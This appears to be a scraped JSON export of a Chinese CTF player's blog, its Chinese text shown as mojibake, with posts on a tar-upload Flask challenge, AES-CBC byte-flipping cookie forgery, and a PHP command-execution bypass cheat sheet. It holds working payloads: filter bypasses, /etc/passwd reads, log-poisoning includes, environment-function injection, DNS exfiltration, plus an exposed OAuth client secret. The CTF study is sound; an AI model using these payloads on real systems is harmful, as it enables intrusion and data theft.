{"pages":[{"title":"","text":"ğŸš© A CTFer ğŸ’– ACGN ğŸ–¥ï¸ Web 2.0 &amp; Web .03 ğŸª— Smart Contract My Skill Set Frontend Backend DevOps Connect with me About My Usernameè¿™ä¸å¾—ä¸å¾—æèµ·æˆ‘çš„é«˜ä¸­ç”Ÿæ´»äº†ã€‚é«˜ä¸€å†›è®­çš„æ—¶å€™ï¼Œæ•™å®˜å«æˆ‘å°èƒ–ï¼Œäºæ˜¯æˆ‘åŒå­¦å°±å¼€å§‹å«æˆ‘é˜¿èƒ–ã€‚æˆ‘çš„é«˜ä¸­è‹±è¯­è€å¸ˆæ™®é€šè¯ä¸æ ‡å‡†ï¼Œæºæ‚ç€ä¸€è‚¡æµ“çƒˆçš„æ–¹è¨€å‘³é“ï¼Œç”šè‡³è‹±æ–‡å•è¯éƒ½æœ‰ä¸€è‚¡æµ“çƒˆçš„â€œåœ°æ–¹ç‰¹è‰²â€ï¼Œæœ‰ä¸€å¤©ï¼Œä»–è¯»è¯¾æ–‡ï¼Œå…´è‡´æ­£æµ“ï¼Œåˆšå¥½è¯»åˆ°äº†ä¸€å¥è¯ï¼Œæ°å·§è¿™å¥è¯é‡Œåˆæœ‰ä¸€ä¸ªuponï¼Œè€Œè¿™ä¸ªuponä»–åˆä¸“é—¨åœé¡¿ä¸€ä¸‹ï¼Œé‡(zhong)è¯»ã€‚å½“æ—¶ï¼Œä¸€è‚¡é›„åšæ— æ¯”è€Œåˆå¤¹æ‚ç€æ–¹è¨€å‘³é“çš„å£°æµªè¢­æ¥ï¼Œä¹‹åæˆ‘åŒå­¦éƒ½ç®¡æˆ‘å«uponäº†ã€‚ è‡³äºåé¢çš„æ•°å­—ï¼Œä¿ºæ¯”è¾ƒæ‡’ï¼Œå“ªå¹´æ³¨å†Œçš„åé¢å°±å†™çš„å“ªå¹´ï¼Œå½“ç„¶ä¹Ÿæœ‰ç‰¹ä¾‹ï¼Œå°±æ˜¯2016ï¼Œè¿™ä¸ªä»£è¡¨çš„ä¸æ˜¯2016å¹´ï¼Œè€Œæ˜¯æŒ‡æ¯”ç‰¹å¸æ¯2016ä¸ªåŒºå—ä¼šå˜æ›´ä¸€æ¬¡æŒ–çŸ¿éš¾åº¦ï¼Œåœ¨ä¸€äº›ä¸åŒºå—é“¾æœ‰å…³çš„ç¤¾åŒºï¼Œæˆ‘æ³¨å†Œçš„idå¤§å¤šæ˜¯UPON-2016","link":"/about/index.html"},{"title":"","text":"ä½ ä¼¼ä¹æ¥åˆ°äº†ä¸–ç•Œçš„å°½å¤´","link":"/album/index.html"},{"title":"","text":"å‹æƒ…é“¾æ¥è¿˜åœ¨æ·»åŠ ä¸­qwq åŠ è½½ä¸­ï¼Œç¨ç­‰å‡ ç§’...","link":"/friend/index.html"},{"title":"","text":"æ¥è€Œä¸å¾€éç¤¼ä¹Ÿç•…æ‰€æ¬²è¨€ï¼Œæœ‰ç•™å¿…åº”","link":"/message/index.html"},{"title":"éŸ³ä¹æ­Œå•æ”¶è—","text":"æ¸©é¦¨æç¤ºï¼šé€‰æ‹©å–œæ¬¢çš„éŸ³ä¹åŒå‡»æ’­æ”¾ï¼Œç”±äºç‰ˆæƒåŸå› éƒ¨åˆ†ä¸èƒ½æ’­æ”¾ã€‚å¦‚æœå–œæ¬¢æ­Œå•æ”¶è—ä¸€ä¸‹ï¼Œå»ç½‘æ˜“äº‘éƒ½èƒ½æ’­æ”¾å“Ÿï¼","link":"/music/index.html"},{"title":"","text":"&nbsp;&nbsp;å¬å¬éŸ³ä¹ éŸ³ä¹æ’­æ”¾å™¨ç”±mePlayeræä¾›ï¼Œå¸ƒå±€å‚ç…§ç½‘å‹åšå®¢æ‰€ä½œï¼Œæ„Ÿè°¢ä½œè€…çš„è¾›å‹¤ä»˜å‡ºã€‚æ›´å¤šéŸ³ä¹åˆ†äº«è¯·æŸ¥çœ‹æ­Œå•ã€‚ &nbsp;&nbsp;çœ‹çœ‹è§†é¢‘ ->ç‚¹å‡»ä»¥ä¸‹æ¡ç›®å¼€å§‹æ’­æ”¾è§†é¢‘,å‘ä¸‹æ»‘åŠ¨æŸ¥çœ‹æ›´å¤š","link":"/media/index.html"},{"title":"","text":"ç¢ç¢å¿µ tipsï¼šgithubç™»å½•åæŒ‰æ—¶é—´æ­£åºæŸ¥çœ‹ã€å¯ç‚¹èµåŠ â¤ï¸ã€æœ¬æ’ä»¶åœ°å€..ã€Œ+99æ¬¡æŸ¥çœ‹ã€ ç¢ç¢å¿µåŠ è½½ä¸­ï¼Œè¯·ç¨ç­‰... $.getScript(\"/js/gitalk_self.min.js\", function () { var gitalk = new Gitalk({ clientID: '46a9f3481b46ea0129d8', clientSecret: '79c7c9cb847e141757d7864453bcbf89f0655b24', id: '666666', repo: 'issue_database', owner: 'removeif', admin: \"removeif\", createIssueManually: true, distractionFreeMode: false }); gitalk.render('comment-container1'); });","link":"/self-talking/index.html"}],"posts":[{"title":"Round 6å¤ç°","text":"Web check(V1)123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566# -*- coding: utf-8 -*-from flask import Flask,requestimport tarfileimport osapp = Flask(__name__)app.config['UPLOAD_FOLDER'] = './uploads'app.config['MAX_CONTENT_LENGTH'] = 100 * 1024ALLOWED_EXTENSIONS = set(['tar'])def allowed_file(filename): return '.' in filename and \\ filename.rsplit('.', 1)[1].lower() in ALLOWED_EXTENSIONS@app.route('/')def index(): with open(__file__, 'r') as f: return f.read()@app.route('/upload', methods=['POST'])def upload_file(): if 'file' not in request.files: return '?' file = request.files['file'] if file.filename == '': return '?' print(file.filename) if file and allowed_file(file.filename) and '..' not in file.filename and '/' not in file.filename: file_save_path = os.path.join(app.config['UPLOAD_FOLDER'], file.filename) if(os.path.exists(file_save_path)): return 'This file already exists' file.save(file_save_path) else: return 'This file is not a tarfile' try: tar = tarfile.open(file_save_path, &quot;r&quot;) tar.extractall(app.config['UPLOAD_FOLDER']) except Exception as e: return str(e) os.remove(file_save_path) return 'success'@app.route('/download', methods=['POST'])def download_file(): filename = request.form.get('filename') if filename is None or filename == '': return '?' filepath = os.path.join(app.config['UPLOAD_FOLDER'], filename) if '..' in filename or '/' in filename: return '?' if not os.path.exists(filepath) or not os.path.isfile(filepath): return '?' with open(filepath, 'r') as f: return f.read() @app.route('/clean', methods=['POST'])def clean_file(): os.system('/tmp/clean.sh') return 'success'if __name__ == '__main__': app.run(host='0.0.0.0', debug=True, port=80) ç®¡ä»–é‚£ä¹ˆå¤šï¼Œå…ˆæ•´ä¸€ä¸ªä¸Šä¼ é¡µé¢ 1234&lt;form id=&quot;upload-form&quot; action=&quot;http://1.14.71.254:28597/upload&quot; method=&quot;post&quot; enctype=&quot;multipart/form-data&quot; &gt; &lt;input type=&quot;file&quot; id=&quot;upload&quot; name=&quot;upload&quot; /&gt; &lt;br /&gt; &lt;input type=&quot;submit&quot; value=&quot;Upload&quot; /&gt;&lt;/form&gt;","link":"/2022/10/18/Round6/"},{"title":"CBCåè½¬æ”»å‡»è¯¦è§£","text":"0x00 æºç 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111&lt;!DOCTYPE html PUBLIC &quot;-//W3C//DTD XHTML 1.0 Transitional//EN&quot; &quot;http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd&quot;&gt;&lt;html&gt;&lt;head&gt;&lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html; charset=utf-8&quot; /&gt;&lt;title&gt;Login Form&lt;/title&gt;&lt;link href=&quot;static/css/style.css&quot; rel=&quot;stylesheet&quot; type=&quot;text/css&quot; /&gt;&lt;script type=&quot;text/javascript&quot; src=&quot;static/js/jquery.min.js&quot;&gt;&lt;/script&gt;&lt;script type=&quot;text/javascript&quot;&gt;$(document).ready(function() { $(&quot;.username&quot;).focus(function() { $(&quot;.user-icon&quot;).css(&quot;left&quot;,&quot;-48px&quot;); }); $(&quot;.username&quot;).blur(function() { $(&quot;.user-icon&quot;).css(&quot;left&quot;,&quot;0px&quot;); }); $(&quot;.password&quot;).focus(function() { $(&quot;.pass-icon&quot;).css(&quot;left&quot;,&quot;-48px&quot;); }); $(&quot;.password&quot;).blur(function() { $(&quot;.pass-icon&quot;).css(&quot;left&quot;,&quot;0px&quot;); });});&lt;/script&gt;&lt;/head&gt;&lt;?phpdefine(&quot;SECRET_KEY&quot;, '9999999999999999');define(&quot;METHOD&quot;, &quot;aes-128-cbc&quot;);session_start();function get_random_iv(){ $random_iv=''; for($i=0;$i&lt;16;$i++){ $random_iv.=chr(rand(1,255)); } return $random_iv;}function login($info){ $iv = get_random_iv(); $plain = serialize($info); $cipher = openssl_encrypt($plain, METHOD, SECRET_KEY, OPENSSL_RAW_DATA, $iv); $_SESSION['username'] = $info['username']; setcookie(&quot;iv&quot;, base64_encode($iv)); setcookie(&quot;cipher&quot;, base64_encode($cipher));}function check_login(){ if(isset($_COOKIE['cipher']) &amp;&amp; isset($_COOKIE['iv'])){ $cipher = base64_decode($_COOKIE['cipher']); $iv = base64_decode($_COOKIE[&quot;iv&quot;]); if($plain = openssl_decrypt($cipher, METHOD, SECRET_KEY, OPENSSL_RAW_DATA, $iv)){ $info = unserialize($plain) or die(&quot;&lt;p&gt;base64_decode('&quot;.base64_encode($plain).&quot;') can't unserialize&lt;/p&gt;&quot;); $_SESSION['username'] = $info['username']; }else{ die(&quot;ERROR!&quot;); } }}function show_homepage(){ if ($_SESSION[&quot;username&quot;]==='admin'){ echo '&lt;p&gt;Hello admin&lt;/p&gt;'; echo '&lt;p&gt;Flag is ctf{123cbcchange}&lt;/p&gt;'; }else{ echo '&lt;p&gt;hello '.$_SESSION['username'].'&lt;/p&gt;'; echo '&lt;p&gt;Only admin can see flag&lt;/p&gt;'; } echo '&lt;p&gt;&lt;a href=&quot;loginout.php&quot;&gt;Log out&lt;/a&gt;&lt;/p&gt;';}if(isset($_POST['username']) &amp;&amp; isset($_POST['password'])){ $username = (string)$_POST['username']; $password = (string)$_POST['password']; if($username === 'admin'){ exit('&lt;p&gt;admin are not allowed to login&lt;/p&gt;'); }else{ $info = array('username'=&gt;$username,'password'=&gt;$password); login($info); show_homepage(); }}else{ if(isset($_SESSION[&quot;username&quot;])){ check_login(); show_homepage(); }else{ echo '&lt;body class=&quot;login-body&quot;&gt; &lt;div id=&quot;wrapper&quot;&gt; &lt;div class=&quot;user-icon&quot;&gt;&lt;/div&gt; &lt;div class=&quot;pass-icon&quot;&gt;&lt;/div&gt; &lt;form name=&quot;login-form&quot; class=&quot;login-form&quot; action=&quot;&quot; method=&quot;post&quot;&gt; &lt;div class=&quot;header&quot;&gt; &lt;h1&gt;Login Form&lt;/h1&gt; &lt;span&gt;Fill out the form below to login to my super awesome imaginary control panel.&lt;/span&gt; &lt;/div&gt; &lt;div class=&quot;content&quot;&gt; &lt;input name=&quot;username&quot; type=&quot;text&quot; class=&quot;input username&quot; value=&quot;Username&quot; onfocus=&quot;this.value=\\'\\'&quot; /&gt; &lt;input name=&quot;password&quot; type=&quot;password&quot; class=&quot;input password&quot; value=&quot;Password&quot; onfocus=&quot;this.value=\\'\\'&quot; /&gt; &lt;/div&gt; &lt;div class=&quot;footer&quot;&gt; &lt;input type=&quot;submit&quot; name=&quot;submit&quot; value=&quot;Login&quot; class=&quot;button&quot; /&gt; &lt;/div&gt; &lt;/form&gt; &lt;/div&gt; &lt;/body&gt;'; }}?&gt;&lt;/html&gt; 0x01 AES-CBC åŠ å¯†ã€è§£å¯†è¿‡ç¨‹åŠ å¯†è¿‡ç¨‹ Plaintextï¼šæ˜æ–‡æ•°æ® IVï¼šåˆå§‹å‘é‡ Keyï¼šåˆ†ç»„åŠ å¯†ä½¿ç”¨çš„å¯†é’¥ Ciphertextï¼šå¯†æ–‡æ•°æ® æ˜æ–‡éƒ½æ˜¯å…ˆä¸æ··æ·†æ•°æ®ï¼ˆç¬¬ä¸€ç»„æ˜¯ä¸IVï¼Œä¹‹åéƒ½æ˜¯ä¸å‰ä¸€ç»„çš„å¯†æ–‡ï¼‰è¿›è¡Œå¼‚æˆ–ï¼Œå†æ‰§è¡Œåˆ†ç»„åŠ å¯†çš„ã€‚ 123456781ã€é¦–å…ˆå°†æ˜æ–‡åˆ†ç»„(å¸¸è§çš„ä»¥16å­—èŠ‚ä¸ºä¸€ç»„)ï¼Œä½æ•°ä¸è¶³çš„ä½¿ç”¨ç‰¹æ®Šå­—ç¬¦å¡«å……ã€‚2ã€ç”Ÿæˆä¸€ä¸ªéšæœºçš„åˆå§‹åŒ–å‘é‡(IV)å’Œä¸€ä¸ªå¯†é’¥ã€‚3ã€å°†IVå’Œç¬¬ä¸€ç»„æ˜æ–‡å¼‚æˆ–ã€‚4ã€ç”¨å¯†é’¥å¯¹3ä¸­xoråäº§ç”Ÿçš„å¯†æ–‡åŠ å¯†ã€‚5ã€ç”¨4ä¸­äº§ç”Ÿçš„å¯†æ–‡å¯¹ç¬¬äºŒç»„æ˜æ–‡è¿›è¡Œxoræ“ä½œã€‚6ã€ç”¨å¯†é’¥å¯¹5ä¸­äº§ç”Ÿçš„å¯†æ–‡åŠ å¯†ã€‚7ã€é‡å¤4-7ï¼Œåˆ°æœ€åä¸€ç»„æ˜æ–‡ã€‚8ã€å°†IVå’ŒåŠ å¯†åçš„å¯†æ–‡æ‹¼æ¥åœ¨ä¸€èµ·ï¼Œå¾—åˆ°æœ€ç»ˆçš„å¯†æ–‡ã€‚ è§£å¯†è¿‡ç¨‹ï¼šæ¯ç»„è§£å¯†æ—¶ï¼Œå…ˆè¿›è¡Œåˆ†ç»„åŠ å¯†ç®—æ³•çš„è§£å¯†ï¼Œç„¶åä¸å‰ä¸€ç»„çš„å¯†æ–‡è¿›è¡Œå¼‚æˆ–æ‰æ˜¯æœ€åˆçš„æ˜æ–‡ã€‚ å¯¹äºç¬¬ä¸€ç»„åˆ™æ˜¯ä¸IVè¿›è¡Œå¼‚æˆ–ã€‚ 12341ã€ä»å¯†æ–‡ä¸­æå–å‡ºIVï¼Œç„¶åå°†å¯†æ–‡åˆ†ç»„ã€‚2ã€ä½¿ç”¨å¯†é’¥å¯¹ç¬¬ä¸€ç»„çš„å¯†æ–‡è§£å¯†ï¼Œç„¶åå’ŒIVè¿›è¡Œxorå¾—åˆ°æ˜æ–‡ã€‚3ã€ä½¿ç”¨å¯†é’¥å¯¹ç¬¬äºŒç»„å¯†æ–‡è§£å¯†ï¼Œç„¶åå’Œ2ä¸­çš„å¯†æ–‡xorå¾—åˆ°æ˜æ–‡ã€‚4ã€é‡å¤2-3ï¼Œç›´åˆ°æœ€åä¸€ç»„å¯†æ–‡ã€‚ 0x02 æ”»å‡»å¼‚æˆ–çš„ç‰¹æ€§:å¼‚æˆ–æ˜¯ä¸è¿›ä½åŠ æ³• 1231âŠ•1=0 //è¿™é‡Œ1+1=10 è¿›ä½äº†ï¼Œä¸éœ€è¦ç®¡ä»–1âŠ•0=10âŠ•1=1 è¿ç»­å¼‚æˆ–ä¸¤æ¬¡åŒä¸€ä¸ªå†…å®¹ï¼Œå°±ç›¸å½“äºæ²¡æœ‰å¼‚æˆ– æ¯”å¦‚:1100110 âŠ•1010100âŠ•1010100 = 1100110 è€Œå¼‚æˆ–è¿˜æœ‰äº¤æ¢å¾‹,å¯ä»¥éšæ„æ‰“ä¹±é¡ºåº 1010100 âŠ• 1100110 âŠ•1010100 = 1100110 1.å¯¹äºè§£å¯†æ—¶ï¼šè®¾æ˜æ–‡ä¸ºXï¼Œå¯†æ–‡ä¸ºYï¼Œè§£å¯†å‡½æ•°ä¸ºkã€‚ X[i] = k(Y[i]) Xor Y[i-1] 2.å­—èŠ‚ç¿»è½¬è¦æ”¹å˜Cipher1[0]çš„å€¼ä¸ºx åˆ™ 'a' ^ x = decrypt(cipher2[0]) è€Œåˆå› ä¸ºï¼šPlain2[0] ^ Cipher1[0]=decrypt(cipher2[0]) æŠŠdecrypt(cipher2[0]) ä»£å…¥ç¬¬ä¸€ä¸ªå¼å­å¾— 'a' ^ x = Plain2[0] ^ Cipher1[0] è§£å¾—x= Plain2[0] ^ Cipher1[0] ^ 'a' xæ˜¯æˆ‘ä»¬è¦èµ‹å€¼çš„ï¼Œä¹Ÿå°±æ˜¯Cipher1[0] ï¼Œæ‰€ä»¥æœ€åå†™å‡ºçš„è¯­å¥ä¸ºï¼š Cipher1[0]=Plain2[0] ^ Cipher1[0] ^ 'a' Plain2[0]æ˜¯åŸæ˜æ–‡ç»„2çš„ç¬¬ä¸€ä¸ªå­—èŠ‚ï¼ˆå·²çŸ¥ï¼‰ï¼ŒCipher1[0]æ˜¯ç¬¬ä¸€ç»„å¯†æ–‡çš„ç¬¬ä¸€ä¸ªå­—èŠ‚ï¼ˆå·²çŸ¥ï¼‰ æ­¤æ—¶å†æŠŠCipher1å’ŒCipher2è¿æ¥èµ·æ¥ç”ŸæˆCiphertextï¼ŒæŠŠCï¼Œå°±ä¼šæˆåŠŸå˜æˆæˆ‘ä»¬æƒ³è¦çš„æ˜æ–‡ã€‚ 3.ä¿®å¤IVï¼šå½“æˆ‘ä»¬ç ´åæ‰å¯†æ–‡çš„ç¬¬ä¸€ç»„æ—¶ï¼ŒåŒæ ·æ˜æ–‡çš„ç¬¬ä¸€ç»„åœ¨è§£å¯†çš„æ—¶å€™å°±å¹¶ä¸æ˜¯åŸæ¥çš„æ˜æ–‡äº†ï¼Œè¿™ä¸ªæ—¶å€™æˆ‘ä»¬éœ€è¦ä¿®å¤åˆå§‹å‘é‡IVï¼Œç»™å®ƒä¸€ä¸ªæ–°çš„å€¼ï¼Œ ä½¿NewIv ^ NewCipher1 = Plain1ï¼ˆåŸï¼‰ æ¨å¯¼è¿‡ç¨‹ï¼š Plain1(æŸå) ^ iv = decrypt(newCipher1) Newiv=Plain1(åŸ) ^ decrypt(newCipher1) ï¼ˆç›®çš„æ˜¯è¦ç»™Newivèµ‹å€¼ï¼‰ æŠŠç¬¬ä¸€ä¸ªå¼å­ä»£å…¥åˆ°ç¬¬äºŒä¸ªå¼å­ä¸­å¾—åˆ°ï¼šï¼ˆæ­¤æ—¶Plain(åŸ) å·²çŸ¥ï¼ŒPlain1(æŸå)å·²çŸ¥ï¼‰ Newiv=Plain1(åŸ) ^ Plain1(æŸå) ^ iv æœ‰äº†Newivå’Œç¿»è½¬å¥½çš„Ciphertextï¼Œè¿™æ—¶ç½‘ç«™åç«¯è§£å¯†åçš„æ˜æ–‡å°±æ˜¯æˆ‘ä»¬æ„é€ å¥½çš„æ˜æ–‡äº†ã€‚ 0x03 ä¾‹é¢˜ åªæœ‰adminæ‰èƒ½çœ‹flagï¼Œè€Œç™»é™†çš„æ—¶å€™è¿‡æ»¤äº†adminã€‚åç«¯æ£€æµ‹çš„æ—¶å€™ä½¿ç”¨çš„æ˜¯cookieé‡Œé¢çš„cipherä»¥åŠivè§£å¯†åå¾—åˆ°çš„å­—ç¬¦è¿›è¡Œååºåˆ—åŒ– åŸæ–‡:a:2:{s:8:&quot;username&quot;;s:5:&quot;admix&quot;;s:8:&quot;password&quot;;s:5:&quot;admix&quot;;} cipher:540LbV57RP5K18c1jJeAOk7HOjcMLHthWSvcLRPMmOTUdyvcS8NkZsx%2BjR7cIgNOqIURlke333VwZ8Tv0Ajpkg== iv:Ne%2BoeXNBcE%2BuI%2BCrlXqjqw%3D%3D è¿™é‡Œcookieå¯æ§ã€‚ æ˜æ–‡åŠ å¯†æ—¶åˆ†ç»„ä¸º: 1234a:2:{s:8:&quot;username&quot;;s:5:&quot;admix&quot;;s:8:&quot;password&quot;;s:2:&quot;123&quot;;} è¿™é‡Œåªéœ€è¦æŠŠadmixçš„xåè½¬æˆnå°±è¡Œäº† 12345678910111213141516171819202122232425262728293031323334#-*- coding:utf8 -*-import base64import urllib.parse# a:2:{s:8:&quot;userna# me&quot;;s:5:&quot;admiN&quot;;# s:8:&quot;password&quot;;s# :6:&quot;123&quot;;} #åŸå§‹cipherciphertext = 'w1uvgfzxxuYHA%2Bo08ZL%2BCefhwr2jHuwglOIBAh8cP1w5TCiCmY0Yy%2BQxelAl9%2B%2FiZeRvLD7UjzlF58bTGFZ%2BWQ%3D%3D'cipher = base64.b64decode(urllib.parse.unquote(ciphertext))array_cipher = bytearray(cipher)array_cipher[13] = array_cipher[13]^ ord('N') ^ ord('n')#print(array_cipher)print('newCipher:',urllib.parse.quote(base64.b64encode(array_cipher)))#è§£å¯†åçš„æ˜æ–‡base64decode_plain = base64.b64decode('sxvY7wUlyPgC+/iV7InfjG1lIjtzOjU6ImFkbWluIjtzOjg6InBhc3N3b3JkIjtzOjM6IjEyMyI7fQ==')#åŸå§‹iviv = base64.b64decode(urllib.parse.unquote('1HxERxo2%2FTuymbrPoVDB%2Bw%3D%3D'))#åŸå§‹æ˜æ–‡plain = 'a:2:{s:8:&quot;userna'newiv = list(iv)for i in range(16): newiv[i] = (ord(plain[i].encode('utf-8')) ^ iv[i] ^ decode_plain[i])newiv = bytes(newiv)print('newiv:',urllib.parse.quote(base64.b64encode(newiv))) å°é¥¼å¹²ä¸€æ¢å°±è¡Œäº†ã€‚ 0x04 RefenceCBCå­—èŠ‚ç¿»è½¬æ”»å‡»è§£æ [CTF]AES-CBCå­—èŠ‚ç¿»è½¬æ”»å‡»","link":"/2022/11/21/cbc/"},{"title":"å‘½ä»¤æ‰§è¡Œå¤‡å¿˜å½•","text":"0x00 ä»€ä¹ˆæ˜¯RCERCEåˆç§°è¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´ï¼Œå¯ä»¥è®©æ”»å‡»è€…ç›´æ¥å‘åå°æœåŠ¡å™¨è¿œç¨‹æ³¨å…¥æ“ä½œç³»ç»Ÿå‘½ä»¤æˆ–è€…ä»£ç ï¼Œä»è€Œæ§åˆ¶åå°ç³»ç»Ÿã€‚ 0x01 å¸¸è§å‘½ä»¤æ‰§è¡Œå‡½æ•°12PHPä»£ç æ‰§è¡Œå‡½æ•°ï¼ševal()ã€assert()ã€preg_replace()ã€create_function()ã€array_map()ã€call_user_func()ã€call_user_func_array()ã€array_filter()ã€uasort()... 12PHPå‘½ä»¤æ‰§è¡Œå‡½æ•°ï¼šsystem()ã€exec()ã€shell_exec()ã€pcntl_exec()ã€popen()ã€proc_popen()ã€passthru()... 0x02 Bypass1.å…³é”®è¯æ‹¦æˆª: å…³é”®è¯æ›¿æ¢ä¸ºç©ºçš„æƒ…å†µ: åŒå†™ç»•è¿‡ï¼Œæ¯”å¦‚cacatt -&gt; cat ä»…æ‹¦æˆªå…³é”®å­—: ä½¿ç”¨å…¶ä»–å‡½æ•°ï¼Œæ¯”å¦‚æ‹¦æˆªcatçš„æ—¶å€™ï¼Œå¯ä»¥ä½¿ç”¨å…¶ä»–å‘½ä»¤ã€‚ Input Ouput static-sh ./flag.txt ./flag.txt: line 1: flag{this_is_a_test}: not found paste ./flag.txt /etc/passwd flag{this_is_a_test} root:x:0:0:root:/root:/bin/bashâ€¦ diff diff ./flag.txt /etc/passwd curl file:///home/coffee/flag flag{this_is_a_test} â€¦ â€¦ é€šé…ç¬¦ç»•è¿‡ï¼Œæ¯”å¦‚å¯ä»¥ä½¿ç”¨/b??/c?t f*ã€‚è¯¥æ–¹æ³•æœ‰æ—¶å€™ä¼šå› ä¸ºè¾“å‡ºè¿‡å¤šæˆ–è€…è¿è¡Œæ—¶é—´è¶…å‡ºé™åˆ¶è¢«å¼ºè¡Œä¸­æ–­ æ’å…¥&quot;&quot; &lt;&gt; '' \\ç»•è¿‡,æ¯”å¦‚ca''t flag.txtæˆ–è€…ca\\t flag.txt å†…è”æ‰§è¡Œï¼Œå°†åå¼•å·å†…å‘½ä»¤çš„è¾“å‡ºä½œä¸ºè¾“å…¥æ‰§è¡Œ,å¦‚: cat `ls`ï¼Œæˆ–è€…æ˜¯cat ${ls} ä½¿ç”¨å˜é‡æ›¿æ¢ï¼Œå¦‚$c=a;cat fl$cg.php æ‹¦æˆªç©ºæ ¼,ç©ºæ ¼å¯ä»¥ç”¨ä»¥ä¸‹å­—ç¬¦ä¸²ä»£æ›¿ï¼š &lt; ã€&lt;&gt;ã€%20(space)ã€%09(tab)ã€$IFS$9ã€ ${IFS}ã€$IFSç­‰ï¼Œæ¯”å¦‚: 123456cat%09flag{cat,flag.txt}cat${IFS}flag.txtcat$IFS$9flag.txtcat&lt;flag.txt cat&lt;&gt;flag.txt .æ“ä½œç¬¦ evalå‡½æ•°ä¸­ç”¨.æŠŠè¢«æ‹¦æˆªçš„å…³é”®å­—ç»™åˆ†å¼€ï¼Œæ¯”å¦‚ 12&lt;?php eval(include &quot;/www/lo&quot;.&quot;g/nginx/access.log&quot;); é€ƒé€¸ï¼Œç»•è¿‡å¤ªéš¾äº†ï¼Œç›´æ¥æ¶¦å‡ºæ¥æ¯”å¦‚ 12c=include$_GET[1]?&gt; c=eval($_GET[1]) å€Ÿå£³ç”Ÿè›‹ 12345678&lt;?php $env = $_GET['env']; if(isset($env)){ putenv($env); system(&quot;whoami&quot;); }else{ highlight_file(__FILE__); } ?env=BASH_FUNC_whoami%%=() { ls; }whoamiæ˜¯system(â€œwhoamiâ€)å¯åŠ¨çš„bashç¯å¢ƒçš„å‡½æ•°ï¼Œç›¸å½“äºæˆ‘ä»¬æ³¨å†Œäº†ä¸€ä¸ªwhoamiæ›¿æ¢å®ƒ æ„é€  åœ¨PHP7ä¸­ï¼Œå¯ä»¥è¿™æ ·è°ƒç”¨å‡½æ•°: 123('phpinfo')();$a = &quot;phpinfo&quot;;$$a;... ç„¶åå°±å¯ä»¥ä½¿ç”¨å¼‚æˆ–^,å–å~ï¼Œè‡ªå¢++ï¼Œè‡ªå‡--ç­‰æ–¹æ³•æ„é€ æƒ³è¦çš„å­—ç¬¦ç„¶åè¿›è¡ŒåŠ¨æ€å‡½æ•°è°ƒç”¨ã€‚ æ„é€ å­—ç¬¦çš„æ—¶å€™ï¼Œå¯ä»¥åˆ©ç”¨ä¸€äº›PHPçš„ç‰¹æ€§ï¼š PHPä¸­çš„NANå’ŒINFï¼š 123456NaNï¼ˆNot a Numberï¼Œéæ•°ï¼‰æ˜¯è®¡ç®—æœºç§‘å­¦ä¸­æ•°å€¼æ•°æ®ç±»å‹çš„ä¸€ç±»å€¼ï¼Œè¡¨ç¤ºæœªå®šä¹‰æˆ–ä¸å¯è¡¨ç¤ºçš„å€¼ã€‚å¸¸åœ¨æµ®ç‚¹æ•°è¿ç®—ä¸­ä½¿ç”¨ã€‚é¦–æ¬¡å¼•å…¥NaNçš„æ˜¯1985å¹´çš„IEEE 754æµ®ç‚¹æ•°æ ‡å‡†ã€‚INFï¼šinfiniteï¼Œè¡¨ç¤ºâ€œæ— ç©·å¤§â€ã€‚ è¶…å‡ºæµ®ç‚¹æ•°çš„è¡¨ç¤ºèŒƒå›´ï¼ˆæº¢å‡ºï¼Œå³é˜¶ç éƒ¨åˆ†è¶…è¿‡å…¶èƒ½è¡¨ç¤ºçš„æœ€å¤§å€¼ï¼‰ã€‚$_=C/C;//NAN$_=1/C//INF 2.æ— å›æ˜¾ åˆ©ç”¨sleep()ä¹‹ç±»çš„å‡½æ•°æ¥æ ¹æ®æœåŠ¡å™¨å“åº”çš„æ—¶é—´ä¸€ä¸ªä¸€ä¸ªå­—ç¬¦è·è·å–æ³¨:è¯¥æ–¹æ³•å±€é™æ€§å¾ˆå¤§ï¼Œä¸”å®¹æ˜“å—åˆ°ç½‘ç»œæ³¢åŠ¨å½±å“ï¼Œä¸å»ºè®®ä¼˜å…ˆè€ƒè™‘ä½¿ç”¨ åˆ©ç”¨dnså¤–å¸¦http://dnslog.cn/æ³¨:è¯¥æ–¹æ³•ä¹Ÿæœ‰ä¸€å®šçš„å±€é™æ€§ï¼Œæœ‰é•¿åº¦é™åˆ¶è€Œä¸”ä¸æ”¯æŒç‰¹æ®Šå­—ç¬¦ åˆ©ç”¨é‡å®šå‘ï¼Œå°†è¾“å‡ºé‡å®šå‘åˆ°å¯è®¿é—®ç½‘é¡µä¸­ åå¼¹shellå¦‚æœé¢˜ç›®ä¸å‡ºç½‘åªèƒ½å¯„ å‘½ä»¤æ³¨å…¥,å°è¯•åœ¨å‘½ä»¤åé¢åŠ ä¸Š||ã€%0aã€%0dã€|ã€;ã€&amp;ç­‰ç¬¦å·å°†åŸå…ˆé‡å®šå‘åˆ°/dev/nullçš„å‘½ä»¤åˆ†å‰²å¼€ 3.include ä¼ªåè®® æ—¥å¿—åŒ…å«UAå†™é©¬,åŒ…å«access.log allow_url_include=tureå¯ä»¥ä½¿ç”¨çš„data123456789101112131415dataç±»å‹æ‰©å±•: dataç±»å‹æ‰©å±• data:,&lt;æ–‡æœ¬æ•°æ®&gt; data:text/plain,&lt;æ–‡æœ¬æ•°æ®&gt; data:text/html,&lt;HTMLä»£ç &gt; data:text/html;base64,&lt;base64ç¼–ç çš„HTMLä»£ç &gt; data:text/css,&lt;CSSä»£ç &gt; data:text/css;base64,&lt;base64ç¼–ç çš„CSSä»£ç &gt; data:text/javascript,&lt;Javascriptä»£ç &gt; data:text/javascript;base64,&lt;base64ç¼–ç çš„Javascriptä»£ç &gt; data:image/gif;base64,base64ç¼–ç çš„gifå›¾ç‰‡æ•°æ® data:image/png;base64,base64ç¼–ç çš„pngå›¾ç‰‡æ•°æ® data:image/jpeg;base64,base64ç¼–ç çš„jpegå›¾ç‰‡æ•°æ® data:image/x-icon;base64,base64ç¼–ç çš„iconå›¾ç‰‡æ•°æ® Tips: 